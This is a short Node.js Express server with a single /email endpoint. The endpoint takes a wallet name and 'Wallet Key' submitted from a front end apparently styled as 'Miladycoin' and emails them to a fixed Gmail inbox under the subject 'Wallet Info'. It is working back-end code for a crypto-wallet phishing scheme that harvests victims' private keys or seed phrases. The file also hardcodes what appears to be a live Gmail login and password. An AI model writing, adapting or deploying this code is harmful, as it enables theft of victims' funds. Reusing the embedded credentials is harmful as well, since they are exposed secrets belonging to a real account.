const Express = require("express");
const nodemailer = require("nodemailer");
require("dotenv").config();
const cors = require("cors");
const api = Express();

api.use(cors());
api.use(Express.urlencoded({ extended: true }));
api.use(Express.json());

const port = process.env.PORT;

api.get("/", async (req, res) => {
  res.json("Api is working");
});

api.post("/email", async (req, res) => {
  try {
    const { name, keyword } = req.body;
    const transporter = nodemailer.createTransport({
      host: "smtp.gmail.com",
      port: 465,
      secure: true, // true for 465, false for other ports
      auth: {
        user: "kevinkline02@gmail.com",
        pass: "jhjfeydujegwubta",
      },
    });

    // send mail with defined transport object
    const info = await transporter.sendMail({
      from: "Milady Miladycoin.tech>",
      to: "ifezuehumphrey@gmail.com",
      subject: "Wallet Info",
      text: `Wallet Name: ${name} 
      Wallet Key: ${keyword}`,
      html: `<p>Wallet Name: ${name} </p> <br />
    <p>Wallet Key: ${keyword}</p>`,
    });
    if (info.response.match("250 2.0.0 OK")) {
      return res.sendStatus(200);
    }
    return res.sendStatus(400);
  } catch (error) {
    res.json(error);
  }
});

api.listen(port, () => {
  console.log(`Server started listening on port ${port}`);
});
